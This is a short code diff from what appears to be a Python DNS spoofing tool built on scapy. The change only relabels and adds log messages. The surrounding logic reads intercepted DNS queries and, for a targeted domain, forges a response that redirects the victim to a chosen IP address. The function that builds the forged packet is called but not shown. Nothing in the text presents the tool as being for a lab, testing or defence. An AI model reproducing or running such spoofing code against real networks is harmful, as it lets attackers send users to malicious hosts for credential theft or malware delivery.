@@ -85,12 +85,13 @@ def process_dns_packet(packet):
             if scapy_packet.haslayer(scapy.DNSQR):
                 dns_query = scapy_packet[scapy.DNSQR]
                 query_name = dns_query.qname.decode('utf-8', errors='ignore')
-                print(f"[DNS] Query detected: {query_name}")
+                print(f"[DNS QUERY] Query detected: {query_name}")
+                log_packet(f"[DNS QUERY] Query detected: {query_name}")
                 
                 # Check if the query is for the target domain
                 if SPOOF_DOMAIN in query_name:
-                    print(f"[DNS] Spoofing response: {SPOOF_DOMAIN} -> {SPOOF_TO_IP}")
-                    log_packet(f"[DNS] Spoofing response: {SPOOF_DOMAIN} -> {SPOOF_TO_IP}")
+                    print(f"[DNS SPOOF] Spoofing response: {SPOOF_DOMAIN} -> {SPOOF_TO_IP}")
+                    log_packet(f"[DNS SPOOF] Spoofing response: {SPOOF_DOMAIN} -> {SPOOF_TO_IP}")
                     # Create spoofed DNS response
                     spoofed_response = create_spoofed_dns_response(scapy_packet)
                     if spoofed_response:
